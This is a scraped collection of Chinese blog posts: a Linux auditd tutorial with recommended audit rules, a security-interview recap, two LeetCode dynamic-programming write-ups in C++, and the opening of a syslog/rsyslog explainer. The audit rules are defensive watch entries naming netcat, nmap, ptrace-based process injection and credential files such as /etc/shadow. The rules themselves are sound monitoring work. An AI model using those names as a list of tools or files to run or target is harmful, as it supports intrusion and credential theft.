消息，这三条消息紧密联系，单独拎出任何一条来看都是没有意义的。\n我们逐一解释这些日志中的字段。首先是第一条日志，它呈现了如下的信息：\ntype ：事件的类型。第一条消息中的 type=SYSCALL 表明这一消息是由系统调用触发； CWD 表明这一消息记录了命令执行时的工作目录（current working directory）； PATH 消息记录了传递给系统调用的路径。注意， PATH 消息仅仅是忠实地记录了命令执行时传递的路径参数，对于一个相对路径，我们需要结合 CWD 来分析出绝对路径。\nmsg ：包裹在小括号之间的内容，表示消息ID。它由两部分组成，冒号 : 前的部分是UNIX时间戳，冒号后的部分是真实的事件ID。同一个系统调用触发的所有消息都具备相同的ID，便于我们进行关联分析。\narch ：执行系统调用的CPU架构。在使用 ausearch 命令搜寻日志时（下文会提到），使用 -i 选项来解码这一字段的值。\nsyscall ：记录了系统调用的编号，一般从 /usr/include/asm/unistd.h 文件中得出，也因此可能随着架构的不同而改变。本例中， syscall=2 表示 less 程序所使用的 open 系统调用。\nsuccess ：事件是否成功。\nexit ：系统调用的返回值，随着不同系统调用的实现而改变。\na0~a3 ：系统调用的前四个参数，以数字形式呈现。这些值也会随着不同系统调用的实现而不同。在本例中，我们记录到如下的值：\na0=62fb60 # 文件路径字符串的地址 a1=0 # 标志位 a2=31 # 工作模式 a3=0\t# 未使用 items ：传递给本应用的字符串个数。\nppid ：父进程ID。\npid ：进程ID。\nauid ：在 对系统调用的审计 一节中提过的 audit ID ，可以作为用户的标识。\nuid ：启动本进程的用户ID， 0 表示root用户。\ngid ：启动本进程的用户组ID。\neuid，suid，fsuid，egid，sgid，fsgid ：略。\ntty ：应用启动时使用的终端，本例中使用了一个 伪终端（pseudoterminal） 。\nses ：登录会话ID。用户登录时将为这一属性赋值，可以用于将进程活动与某一次登录事件联系起来。\ncomm ：任务列表中呈现的应用名称。\nexe ：解析得到的二进制文件路径。\nsubj ：记录本进程是否属于某个安全上下文，例如在AppArmor中，如果定义了本进程的安全上下文，则其属性也将得到记录。\nkey ：如果需要对大量的文件或目录进行监控，可以在规则中添加这一字段，方便后续使用 ausearch 等工具查找。\n第二条日志则呈现了 less 命令执行时的工作目录信息，别无其他意义。\n第三条日志呈现的信息解释如下：\nitem ：在本例中， item 字段表示 a0 参数，即 SYSCALL 消息中记录的系统调用的第一个参数。如果某个系统调用接收了多个路径参数，就会有更多的 PATH 类型的消息产生。 name ：呈现传递给系统调用的具体路径名称。 inode ：表示与 name 相关的 inode 编号。 dev ：文件存储的具体设备。 mode ：文件访问控制权限的数字表示。在本例中，root用户具有读写的权限、root所在的用户组具有读取文件的权限，而其余的所有用户（组）则完全不具备本文件的访问权限。 ouid、ogid ：指向相关 inode 的UID和GID。 rdev ：本例中没有意义。该字段仅适用于块设备或字符设备，与文件无关。 日志的搜索与分析 audit框架提供了一些日志查找工具，以便查看系统上发生的一系列事件。\n通过pid 通过进程id来查看特定事件：\n# ausearch -p 1 该命令将呈现所有与ID为1的进程相关的事件。\n通过key 通过 key 来管理事件是audit框架中一个很棒的特性，推荐日常使用。\n可以在规则中使用 -k 选项来为相关事件打上标签，方便后续查找：\n# auditctl -w /etc/passwd -p rwxa -k KEY_pwd 紧接着，查找所有带有键值 KEY_pwd 的事件，ausearch将呈现所有与文件 /etc/passwd 相关的事件：\n# ausearch -k KEY_pwd 查看异常事件 方才介绍了 ausearch 的基本用法，而此前提及的 aureport 工具更擅长快速地报告系统上的异常事件，例如，网卡工作在混杂模式、进程或线程由于ENOMEM等错误崩溃推出等等。\n最简单的查看异常的命令是：\n# aureport -n 也可以使用此工具生成自定义报告，详见 aureport 文档 。\n值得记录的文件或系统调用 始终注意，所有列入审计的文件和系统调用都将产生日志，因此要对日志的数量保持谨慎。一般来说，与安全相关的事件和文件都需要被记录，如IDS、IPS、anti-rootkits等等；与此相对地，对于 write 类型的系统调用就没必要进行记录，否则即便是最微不足道的写入操作都会被记录到日志中。\n人们可以设置一系列复杂的规则来实现对审计事件的精细管控，详见 auditctl文档 。\n本文中给出两份可用度较高的规则文件 [附件1](#附件1 推荐规则（1）) 和 [附件2](#附件2 推荐规则（2）) ，可以直接将它们复制到 /etc/audit/audit.rules 中。\n远程日志传输 audit框架提供了用于实现日志转发的插件，可以将本地日志转发到远程auditd主机上。\n发送日志 实现日志的发送，需要具备 audisp-remote 插件，该插件由audit安装包默认自带。通过修改如下文件来激活插件：\n# 文件 /etc/audisp/plugins.d/au-remote.conf --- active = yes direction = out path = /usr/bin/audisp-remote type = always format = string 并在如下文件中设置目标主机（即日志发送的对象）：\n# 文件 /etc/audisp/audisp-remote.conf --- remote_server = [domain_name | ip] port = 60 ## localport = optional transport = tcp 接收日志 接受日志的配置较为简单：\n# 文件 /etc/audit/auditd.conf --- tcp_listen_port = 60 tcp_listen_queue = 5 tcp_max_per_addr = 1 ## tcp_client_ports = 1024-65535 #optional tcp_client_max_idle = 0 参考资料 [1] Audit framework - ArchWiki (archlinux.org)\n[2] Understanding Linux Audit | Security Guide | SUSE Linux Enterprise Server 11 SP4\n附件1 推荐规则（1） # This file contains the auditctl rules that are loaded # whenever the audit daemon is started via the initscripts. # The rules are simply the parameters that would be passed # to auditctl. # First rule - delete all -D # Increase the buffers to survive stress events. # Make this bigger for busy systems -b 320 # Feel free to add below this line. See auditctl man page -w /etc/passwd -p wa -k passwd_changes -w /etc/selinux/ -p wa -k selinux_changes -w /sbin/insmod -p x -k module_insertion -w /etc/shadow -p wa -k shadow_changes -w /etc/sysconfig -p wa -k sysconfig_changes -w /etc/audit/audit.rules -p wa -k audit_rules_changes -w /etc/audit/auditd.conf -p wa -k audit_conf_changes -w /usr/sbin/vpnc -k vpnc_exec -p x -w /usr/bin/stunnel -k stunnel_exec -p x -w /usr/bin/nc -p x -k ncat_exec -w /usr/bin/nmap -p x -k nmap_exec -w /usr/bin/sudo -p x -k sudo_exec -w /usr/bin/su -p x -k su_exec -w /etc/group -p wa -k group_changes -w /var/log/wtmp -p w -k wtmp_changes -w /var/log/btmp -p w -k btmp_changes -w /usr/bin/getent -k getent_exec -p x -w /etc/rc.d/init.d -p wa -k initd_changes -w /etc/security/opasswd -p wa -k opasswd_changes -w /etc/gshadow -p wa -k gshadow_changes -w /etc/securetty -p wa -k securetty_changes -w /etc/login.defs -p wa -k login_defs_changes -w /etc/ld.so.conf -p wa -k ld_so_conf_changes -w /etc/sudoers -p wa -k sudoers_changes -w /etc/profile -p wa -k profile_changes -w /etc/hosts -p wa -k hosts_changes -w /etc/inittab -p wa -k inittab_changes -w /etc/sysconfig/iptables -p wa -k iptables_changes -w /etc/hosts.allow -p wa -k hosts_allow_changes -w /etc/hosts.deny -p wa -k hosts_deny_changes -w /root/.ssh/authorized_keys -p wa -k authorized_keys_changes -w /etc/crontab -p wa -k crontab_changes -w /etc/ssh/sshd_config -p wa -k sshd_config_changes -a always,exit -F arch=b32 -S ptrace -k process_inject -a always,exit -F arch=b64 -S ptrace -k process_inject -w /usr/bin/rdesktop -p x -k rdesktop_exec -w /etc/exports -p wa -k exports_changes -w /lib/modules/ -p wa -k lib_modules_changes -w /sbin/iptables-multi -p x -k iptables_exec -w /var/spool/cron/root -p wa -k spool_cron_root_changes -w /etc/resolv.conf -p wa -k resolv_conf_changes -a always,exit -S execve -k execve_event -a exit,always -S all -F euid=0 -F perm=awx -k root-commands 附件2 推荐规则（2） auditd/audit.rules at master · Neo23x0/auditd · GitHub\n","date":"2021-08-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/audit-%E7%AE%80%E8%BF%B0/","title":"audit 简述"},{"content":"安全攻防工程师一面，大概率是寄了，此前也没有遇到过这种难度的面试，稍作记录吧。\n恶意样本的静态分析？\n大致答了一些常见的，PE文件头的分析、文件哈希、符号表、反编译之后的控制流和数据流等。\n如果针对内存驻留的恶意程序呢？\n显然就是上一个问题的Plus版本。没有思路。面试官提醒我可以考虑内存的R/W/X属性。我就说可以检测可执行的内存段，然后根据这些内存段的内容去生成可执行代码的特征，送入机器学习模型进行检测。扯就完事了……\n一个进程中如果有多个线程（比如100个），CPU只有4个核，怎么分配？\n属于是多线程的一个小盲区，我知道Python由于GIL全局锁，多线程是假的多线程，不知道其他语言的情况。\ngit熟悉吗？分支是干啥的？\n只在日常博客中用git，分支知道一点点，就是从主线上分出若干个分支，团队成员在上面开发，不影响主线版本，最后再合并起来。\n多线程扫描的时候，流量可能很大，怎么进行控制，怎么能不把目标扫崩（扫描不能产生DoS的效果）？\n我把这个问题提炼成并发流量的控制，进一步就是并发线程的控制。只要控制活跃的线程数量，就能达到控制流量的作用。\n5.1. 那怎么控制线程的数量？\n可能可以先起一个线程，以这个线程的流量为标准，根据我们设定的阈值来得出线程的最大活跃数量。\n5.2. 但是在实际的环境中，你到达目标的流量可能跟你出口的流量相差很多，因为你的流量要到达目标，还要过公网环境？\n但是我们只能控制和计算出口流量，所以只能以出口流量为标准啊。考虑公网环境的损失的话，可能可以按照出口流量的计算值，再稍微上调一些，作为阈值。\n内心OS：瞎扯就完了。后来面试官建议可以去看看nmap的流量控制，这一点打算以后有空写个博客。\n多个模块之间的解耦。举例如下：\n有四个模块分别是：【端口发现】、【服务识别】、【Web模糊测试】、【POC测试】，模块之间相互作用，主程序如何将他们联系起来？\n这题给我问懵了，开始瞎扯。\n首先分析，这四个模块应该是串联的关系，即服务识别模块依赖端口发现的输出，这样就可以用生产者消费者的模型来把他们组织起来。由于我们并不需要前一个模块的完整输出，只需要前一个模块产生部分输出，后一个模块就可以开始工作了，所以可以用流水线的思路来组织。\n进一步开始扯IOC，逆转控制，就是原本是一个模块来实例化另一个模块，但是这样他们就耦合在一起了，IOC就是引入一个第三方控制程序，由它来讲另一个模块的对象在合适的时机注入到模块中，各个模块就不需要在自己的代码中引用其他模块了。\n然后扯到消息队列，可能上一个模块产生输出之后，就可以挂到下一个模块的消息队列上，唤醒下一个模块来开始工作。\n然而消息队列的具体实现并不了解，就没有多讲。\n聊了聊其他项目，还有啥问题没，over。\n总体来说，整个面试的技术内容还是比较硬核，确实能够起到筛选人的作用。很多问题不一定要你会细节，脑洞够大就行；同时，你在安全领域的见识够不够丰富，也是能问出来的。\n我个人的能力确实没有非常精的领域（毕竟本科是通识教育啊操），大概率是凉了。\n但是相比之下，此前字节一面二面的问题全是八股，万年不变的那种，完事之后撕代码，筛人全靠算法，简直无语。被这种面试挂了，总比被算法挂了来得服气，整场体验能给个3.5分吧。\n","date":"2021-08-21T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E9%9D%A2%E7%BB%8F-%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%B7%A5%E7%A8%8B%E5%B8%88/","title":"深信服面经-安全攻防工程师"},{"content":"题目 给你一个数组 target ，包含若干 互不相同 的整数，以及另一个整数数组 arr ，arr 可能 包含重复元素。\n每一次操作中，你可以在 arr 的任意位置插入任一整数。比方说，如果 arr = [1,4,1,2] ，那么你可以在中间添加 3 得到 [1,4,3,1,2] 。你可以在数组最开始或最后面添加整数。\n请你返回 最少 操作次数，使得 target 成为 arr 的一个子序列。\n一个数组的 子序列 指的是删除原数组的某些元素（可能一个元素都不删除），同时不改变其余元素的相对顺序得到的数组。比方说，[2,7,4] 是 [4,2,3,7,2,1,4] 的子序列（加粗元素），但 [2,4,2] 不是子序列。\n示例1\n输入： target = [5,1,3], arr = [9,4,2,3,4] 输出： 2 解释： 你可以添加 5 和 1 ，使得 arr 变为 [5,9,4,1,2,3,4] ，target 为 arr 的子序列。 示例2\n输入： target = [6,4,8,1,3,2], arr = [4,7,6,2,3,8,6,1] 输出： 3 数据范围\n1 \u0026lt;= target.length, arr.length \u0026lt;= 10^5 1 \u0026lt;= target[i], arr[i] \u0026lt;= 10^9 target 不包含任何重复元素。 分析 1 直观解法 首先，我们可以非常直接地想到两个数组的 最长公共子序列 的问题。\n我们求出 target 和 arr 的最长公共子序列，然后在 arr 中，对这个序列进行元素的增添，即可使得 target 变成 arr 的子序列。于是答案应该是： target.size() - LongestCommonSequence.size() 。\n然而，最长公共子序列所需的DP，时间复杂度是 O(n^2) ，根据题目的数据范围，会超时。\n给出超时代码如下，可以通过 73/82 个用例。\nclass Solution { public: int minOperations(vector\u0026lt;int\u0026gt;\u0026amp; target, vector\u0026lt;int\u0026gt;\u0026amp; arr) { // dp[a][b] target 从a开始,arr从b开始 得到的最长子序列 // target[a] == arr[b],则 dp[a][b] = dp[a - 1][b - 1] + 1 // target[a] != arr[b]。则 dp[a][b] = max(dp[a][b - 1], dp[a - 1][b], dp[a - 1][b - 1]) vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; dp(target.size() + 1, vector\u0026lt;int\u0026gt;(arr.size() + 1, 0)); for (int a = 0; a \u0026lt; target.size(); a++) { for (int b = 0; b \u0026lt; arr.size(); b++) { if (target[a] == arr[b]) { dp[a][b] = (a == 0 || b == 0) ? 1 : dp[a - 1][b - 1] + 1; } else { if (a != 0 \u0026amp;\u0026amp; b != 0) { dp[a][b] = max( max(dp[a][b - 1], dp[a - 1][b]), dp[a - 1][b - 1] ); } else if (a == 0 \u0026amp;\u0026amp; b == 0) { dp[a][b] = 0; } else if (a == 0) { dp[a][b] = dp[a][b - 1]; } else { dp[a][b] = dp[a - 1][b]; } } } } return target.size() - dp[target.size() - 1][arr.size() - 1]; } }; 2 问题转化 在最长公共子序列超时之后，就想不到其他的解法了……\n翻阅题解发现，此前少考虑了一个条件：target 数组中的元素 互不相同 。\n这是什么意思呢？我们似乎可以用某种映射来处理 target 数组中的元素啊。\n我们发现，在 arr 数组中，可以用 下标 来代表 target 数组中的元素。\n例如题目给出的示例2， target = [6,4,8,1,3,2] ， arr = [4,7,6,2,3,8,6,1] 。那么对于既出现在 target 数组中、又出现在 arr 数组中的元素 6,4,8,1,3,2 来说，我们直接在 arr 数组中将它们改写为这些元素在 target 数组中的下标，即使得 arr = [1,?,0,5,4,2,0,3] 。\n我们要求这两个数组的最长公共子序列，这个子序列在 target 数组中是从前往后的，相当于是在转换后的 arr 数组中求得一个 最长递增 的序列。\n对于像 7 这样只出现在 arr 数组中、不出现在 target 数组中的元素，它不可能出现在最长公共子序列中，也因此不应该放入最长递增序列的考虑范围，我们随便将它改为某个特定的值，在考虑最长递增序列的时候判断一下即可。\n那么，我们应该如何求最长递增子序列呢？\n2.1 最长递增子序列：DP 最长递增子序列的模板题可以看 300. 最长递增子序列 - 力扣（LeetCode） (leetcode-cn.com) 。\n首先，最容易想到的办法肯定是DP了。我们使用数组 dp[i] 表示以第 i 个元素为结尾的最长递增子序列长度；那么，每考虑一位 i ，我们都要向前看 j = 0 ~ i-1 ，如果 nums[i] \u0026gt; nums[j] ，说明 nums[i] 可以直接加到这一序列上，得到的长度是 dp[j] + 1 ，所以 dp[i] = max(dp[j] + 1), j = 0~i-1且nums[i]\u0026gt;nums[j] 。\n这一思想跟 难题本 | LeetCode面试题 08.13. 堆箱子 (gitee.io) 这篇文章中使用的DP是一样的。\n使用这一思想做出来的模板是这样的：\n// LeetCode 300. 最长递增子序列 class Solution { public: int lengthOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; dp(nums.size() + 2, 1); dp[1] = 1; for (int i = 2; i \u0026lt;= nums.size(); i++) { // cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; // dp[i] = dp[i - 1]; for (int last = i - 1; last \u0026gt;= 1; last--) { if (nums[i - 1] \u0026gt; nums[last - 1]) { dp[i] = max(dp[i], dp[last] + 1); } } // cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; endl; } int res = INT_MIN; for (int i = 1; i \u0026lt;= nums.size(); i++) res = max(res, dp[i]); return res; } }; Performance1 问题是，这样做法复杂度还是 O(n^2) ，无法通过我们最初的问题。\n2.2 最长递增子序列：贪心+二分 考虑一个简单的贪心，如果我们要使上升子序列尽可能的长，则我们需要让序列上升得尽可能慢，因此我们希望每次在上升子序列最后加上的那个数尽可能的小。\n这样，我们使用一个数组 rec 来维护当前序列，如果一个数 nums[i] \u0026gt; rec.back() ，说明这个数可以直接放入序列中而不影响序列的递增性质，非常好；而如果 nums[i] \u0026lt; rec.back() ，那么我们应该去 rec 中找到 第一个大于 nums[i] 的数 ，使用 nums[i] 替换它。\n上面的第二个条件看起来非常令人疑惑，实际上我们考虑这一情况的极端场景：整个 rec 数组中只有最后一个数比 nums[i] 更大。\n例如 rec = [1,2,3,4,9] ， nums[i] = 5 ，那么，我们会自然地想到将 9 替换成 5 ，因为这样做能够维持序列的递增性，而且对于之后出现的 nums[i] 来说，继续加入这一递增序列的 可能性 更高。\n更普遍地讲，我们将 rec 中第一个大于 nums[i] 的数替换成 nums[i] ，不会影响整个序列的递增性。假设被替换的数为 x ，有如下的两点：\nrec 数组中， x 之前的所有数都小于 nums[i] ，因为 x 是第一个大于 nums[i] 的数； x 之后的所有数本来就大于 x ，而 x 大于 nums[i] ，因此 x 之后的所有数都大于 nums[i] ； 可以看到，将 nums[i] 加入 rec 之后，对原有的递增性质没有任何影响；而对于之后出现的 nums[i] 来说，现在的 rec 数组已经是 尽可能小 的数组了，更容易加入到它们中间，维持递增。\n这就是贪心的思想。而对于从 rec 中找到第一个大于 nums[i] 这一任务，我们可以利用 rec 的有序性，使用二分的办法进行查找。\n这就有了如下的代码：\nclass Solution { public: int lengthOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; rec; int len = 1; rec.push_back(nums[0]); for (auto n : nums) { if (n \u0026gt; rec[len - 1]) { rec.push_back(n); len++; } else if (n \u0026lt; rec[len - 1]) { int left = 0; int right = len - 1; int mid; while (left \u0026lt;= right) { mid = (left + right) \u0026gt;\u0026gt; 1; if (rec[mid] \u0026gt;= n) right = mid - 1; else left = mid + 1; } rec[left] = n; } } return len; } }; 注意二分的边界，最终 left 应该指向第一个大于 nums[i] 的数，因此直接修改 rec[left] 即可。\nPerformance2 3 本题终解 回到最初的问题来。\n经过问题的转化，我们知道应该将 arr 数组中出现的 target 元素转化成它们在 target 数组中的下标，然后去求 arr 数组中的最长递增子序列的长度。\n这就比较简单了。我们使用二分+贪心的办法，时间复杂度是 O(nlogn) ，应该可以AC。\nclass Solution { public: int minOperations(vector\u0026lt;int\u0026gt;\u0026amp; target, vector\u0026lt;int\u0026gt;\u0026amp; arr) { map\u0026lt;int, int\u0026gt; mp; for (int idx = 0; idx \u0026lt; target.size(); idx++) { mp[target[idx]] = idx; // target[idx] 出现的位置 } for (int i = 0; i \u0026lt; arr.size(); i++) { if (mp.count(arr[i])) { arr[i] = mp[arr[i]]; } else { arr[i] = INT_MIN; } } vector\u0026lt;int\u0026gt; rec(1, INT_MIN); int len = 0; for (auto n : arr) { if (n \u0026gt; INT_MIN \u0026amp;\u0026amp; n \u0026gt; rec[len]) { rec.push_back(n); len++; } else if (n \u0026gt; INT_MIN) { int left = 1; int right = len; while (left \u0026lt;= right) { int mid = (left + right) \u0026gt;\u0026gt; 1; if (rec[mid] \u0026gt;= n) right = mid - 1; else left = mid + 1; } rec[left] = n; } } return target.size() - len; } }; Performance3 参考资料 [1] 力扣官方题解.得到子序列的最少操作次数[EB/OL].2021-07-25\n得到子序列的最少操作次数 - 得到子序列的最少操作次数 - 力扣（LeetCode） (leetcode-cn.com)\n[2] 力扣官方题解.最长上升子序列[EB/OL].2020-03-13\n最长上升子序列 - 最长递增子序列 - 力扣（LeetCode） (leetcode-cn.com)\n","date":"2021-08-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1713.-%E5%BE%97%E5%88%B0%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%9C%80%E5%B0%91%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/","title":"难题本 | LeetCode1713. 得到子序列的最少操作次数"},{"content":"这道题有点难，但并不是完全难。\n题目 堆箱子。给你一堆n个箱子，箱子宽 wi、深 di、高 hi。箱子不能翻转，将箱子堆起来时，下面箱子的宽度、高度和深度必须大于上面的箱子。实现一种方法，搭出最高的一堆箱子。箱堆的高度为每个箱子高度的总和。\n输入使用数组 [wi, di, hi]表示每个箱子。\n示例1\n输入： box = [[1, 1, 1], [2, 2, 2], [3, 3, 3]] 输出： 6 示例2\n输入： box = [[1, 1, 1], [2, 3, 4], [2, 6, 7], [3, 4, 5]] 输出： 10 数据范围\n箱子的数目不大于3000个。 分析 箱子有三个维度，一瞬间就让人想到了三维的DP。\n能否降低循环层数呢？我们注意到题目中所说的 下面箱子的宽度、高度和深度必须大于上面的箱子 ，那么，只需要根据任意一个维度进行排序，最终箱子叠起来的顺序就是排序后的顺序（正序或反序）。\n更具体地说，假如我们以宽度 w 为参照进行降序排序，则当 i \u0026lt; j 时，第 i 个箱子 一定 在第 j 个箱子下面（如果它们都被选中的话），因为第 i 个箱子的宽度更大。\n这样，我们就可以少考虑一个维度了。\nsort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026gt; b[0]; }); 接着，我们考虑深度和高度。\n错解 很容易陷入传统DP的思路中：令 dp[w][h] 表示深度 d 、高 h 时所能取得的最大高度，则令最外层箱子下标从 0 到 box.size() - 1 循环，每一次循环都令深度和高度从 1 到 maxDepth or maxHeight 进行循环，那么当前这一箱子，面对深度 d 和高度 h 的时候，取得 dp[d][h] = max(dp[d][h], dp[box[idx][1]][box[idx][2]] + box[idx][2]) 。\n理论上，这一状态转换公式来源于一个事实，即当前这一箱子有两种选择：\n放上去：则留给上一个箱子的空间只剩下 box[idx][1] 的深度，以及 box[idx][2] 的高度，上一个箱子利用这两个数值取到的最大高度是 dp[box[idx][1]][box[idx][2]] ，加上当前箱子本身的高度 box[idx][2] 即为这一方案最终取得的高度； 不放上去：则留给上一个箱子的空间不变。 利用这一思路写出如下的代码：\nclass Solution { public: int pileBox(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; box) { int maxWidth = INT_MIN; int maxDepth = INT_MIN; int maxHeight = INT_MIN; for (auto b : box) { maxDepth = max(maxDepth, b[1]); maxHeight = max(maxHeight, b[2]); } sort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026lt; b[0]; }); int dp[maxDepth + 2][maxHeight + 2]; memset(dp, 0, sizeof(dp)); for (int idx = 0; idx \u0026lt; box.size(); idx++) { for (int d = maxDepth + 1; d \u0026gt;= 1; d--) { for (int h = maxHeight + 1; h \u0026gt;= 1; h--) { if (box[idx][1] \u0026lt; d \u0026amp;\u0026amp; box[idx][2] \u0026lt; h) { dp[d][h] = max(dp[d][h], dp[box[idx][1]][box[idx][2]] + box[idx][2]); } } } } return dp[maxDepth + 1][maxHeight + 1]; }; 这个代码的问题在于：题目中要求的是下方箱子的各项数值必须 严格大于 上方的箱子。尽管我们进行了排序，相邻箱子的 宽度 仍然可能是相同的！在状态转移的过程中，我们考虑了上一个箱子的深度和高度都严格小于当前箱子，却遗漏了它的宽度。\n这就使得我们取到的 dp[box[idx][1]][box[idx][2]] + box[idx][2] 可能同时将当前箱子和上一个箱子都堆上了，而当前箱子与上一个箱子在宽度上是相同的。\n这一情况体现在用例 2 中，对宽度进行排序，这一代码将输出答案 12 ，表示将 [1,1,1] 、 [2,3,4] 和 [2,6,7] 这三个箱子都堆上了；而，尽管 [2,3,4] 和 [2,6,7] 在深度和高度上递增，却在宽度上相同，我们的代码无法考虑这一情形。\n正解 有一说一，陷入了错解的思路之后，很难自拔，正解来源于题解。\n我们需要改变 dp 数组的含义，现在，令它作为一个一维数组， dp[i] 表示将第 i 个箱子置顶时，取得的最大高度。\n我们还是将宽度 降序排序 ，如果希望将第 i 个箱子置顶，那么它底下的箱子只可能出现在 0 ~ i - 1 的下标范围内。\n每次考虑到一个 i 时，我们就向前遍历 0 ~ i - 1 号箱子，如果某个箱子满足三个维度都大于当前的 i 号箱子，则可以得到一个 dp[n] + box[i][2] 的方案，含义是将第 n 号箱子置顶时的最大高度，加上现在的第 i 号箱子的高度。\n这一方法简直是很直观了，但是需要扣几个细节：\ndp[0] 显然是第 0 号箱子 置顶 时的最大高度，当前箱子有没有可能不放在任何箱子上呢？当然可能。因此，遍历完 0 ~ i - 1 号箱子之后，还要将取得的最大方案与 box[i][2] 进行比较； 最终返回的答案可不是 dp[box.size() - 1] ！有悖于传统的DP方案，这里的 dp[box.size() - 1] 表示将最后一个箱子置顶时的最大高度，然而最后一个箱子可不一定要被选中，我们应该遍历所有箱子，取得最大值。 AC代码 class Solution { public: int pileBox(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; box) { if (!box.size()) return 0; sort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026gt; b[0]; }); // dp[i] 表示将第i个箱子放在顶部能够取得的最大的高度 // dp[i] = max(dp[n] + box[i][2]) vector\u0026lt;int\u0026gt; dp(box.size(), 0); dp[0] = box[0][2]; for (int i = 1; i \u0026lt; box.size(); i++) { // cout \u0026lt;\u0026lt; box[i][0] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[i][1] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[i][2] \u0026lt;\u0026lt; endl; for (int n = i - 1; n \u0026gt;= 0; n--) // 遍历所有可能的底部 { // cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; box[n][0] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[n][1] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[n][2] \u0026lt;\u0026lt; endl; if (box[n][0] \u0026gt; box[i][0] \u0026amp;\u0026amp; box[n][1] \u0026gt; box[i][1] \u0026amp;\u0026amp; box[n][2] \u0026gt; box[i][2]) { dp[i] = max(dp[i], dp[n] + box[i][2]); } } dp[i] = max(dp[i], box[i][2]); // 表示第 i 号箱子不放在任何箱子顶上 } int res = INT_MIN; // 答案不是 dp[box.size() - 1] ！要循环取得最大值 for (int i = 0; i \u0026lt; box.size(); i++) { res = max(dp[i], res); } return res; } }; 参考资料 [1] ffreturn.08.13 c++几乎双百的暴力动态规划[EB/OL].2021-06-01\n08.13 c++几乎双百的暴力动态规划 - 堆箱子 - 力扣（LeetCode） (leetcode-cn.com)\n[2] knight.【猎豹题解日记】动态规划、回溯两种解法[EB/OL].2020-07-08\n【猎豹题解日记】动态规划、回溯两种解法 - 堆箱子 - 力扣（LeetCode） (leetcode-cn.com)\n","date":"2021-07-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode%E9%9D%A2%E8%AF%95%E9%A2%98-08.13.-%E5%A0%86%E7%AE%B1%E5%AD%90/","title":"难题本 | LeetCode面试题 08.13. 堆箱子"},{"content":"断更了将近两个月？\n五月下旬开始参加实习，工作颇为忙碌，单程一小时的通勤也磨灭了我回到宿舍之后继续学习和输出的热情；然而实习已近两月，所幸稍有所得，不做记录则恐愧对时光矣。\nsyslog工作流程简述 不管是什么应用，日志机制永是最重要的机制之一，从日志中，维护人员可以排查错误、发现攻击，从而有效地提高应用的可用性。\n操作系统也是如此，本文将对Linux日志机制中的一个重要组成部分——syslog/rsyslog——进行一个简要的叙述。\n大部分Linux发行版默认的日志守护进程为syslog（或较新版本的rsyslog），位于 /etc/syslog 或 /etc/syslogd 或 /etc/rsyslog.d ，默认配置文件为 /etc/syslog.conf 或 rsyslog.conf ，任何希望生成日志的程序都可以向syslog发送信息。\nsyslog应该对接收的信息进行某种处理。我们可以从直觉出发，考虑一下syslog收到一条信息后应该做哪些事情：首先，系统中有那么多的信息源，我们会考虑对这些信息源进行分类；之后，每个信息源给出的信息都具有不同的情境，正常运行产生的信息跟报错信息肯定不能一视同仁的，我们会考虑根据信息的严重性对这些信息进行分类；最后，符合筛选条件的信息就触发某种动作，比如把它写进某个日志文件里。\n流程图是个好东西。我们假设系统中有若干类信息源，每类信息源产生不同等级的信息，那么syslog应该对这些信息进行分类分级处理，如下图所示：\nsyslog处理分类分级处理信息 当然，这一流程图只是为了较为直观地呈现syslog分类分级的机制，以使读者有个初步的印象，接下来，我们将从配置文件出发，介绍syslog（rsyslog）的日志记录细节。\n过滤规则 如果你的系统是CentOS，可以打开 /etc/rsyslog.conf ，这是syslog的配置文件，Ubuntu下的配置文件位于 /etc/rsyslog.d/50-default.conf ；在这里，你可以看到不少类似下方的语句：\nauthpriv.* /var/log/secure\n这是syslog日志记录的一条规则，我们将规则拆开来看，实际上只有三个部分：\n规则的组成 第一个部分是facility（设备类型），第二个部分是priority（优先级/严重性），第三个部分是action（动作）。\n你应该能够想到，这一条规则就描述了上文所说的对消息进行分类分级处理的过程！\n仔细看看配置文件吧，每一条规则都是如此的简单而实用：\n#### RULES #### # Log all kernel messages to the console. # Logging much else clutters up the screen. #kern.* /dev/console # Log anything (except mail) of level info or higher. # Don\u0026#39;t log private authentication messages! *.info;mail.none;authpriv.none;cron.none /var/log/messages # The authpriv file has restricted access. authpriv.* /var/log/secure # Log all the mail messages in one place. mail.* -/var/log/maillog # Log cron stuff cron.* /var/log/cron # Everybody gets emergency messages *.emerg :omusrmsg:* facility 规则的第一部分facility指的是消息源设备的类型。syslog体系中已经将Linux中的大部分进程进行了合理的分类，例如与内核消息相关的 kern 类型、与授权信息相关的 auth/authpriv 